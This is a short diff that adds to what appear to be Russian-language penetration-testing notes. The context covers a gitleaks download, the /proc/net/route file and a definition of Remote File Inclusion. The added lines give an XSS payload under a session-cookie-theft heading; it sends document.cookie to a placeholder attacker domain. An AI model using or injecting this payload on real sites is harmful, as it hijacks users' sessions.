@@ -71,3 +71,8 @@ wget https://github.com/zricethezav/gitleaks/releases/download/v1.22.0/gitleaks-
 /proc/net/route — сведения о маршрутизации.
 
 Если злоумышленник может загружать файлы с удаленного сервера на атакуемый,— это уязвимость Remote File Inclusion.
+
+
+#xss угон session кук
+<script>document.write("<img src='http://your domain
+/xxx?cookie="+document.cookie+"'")</script>
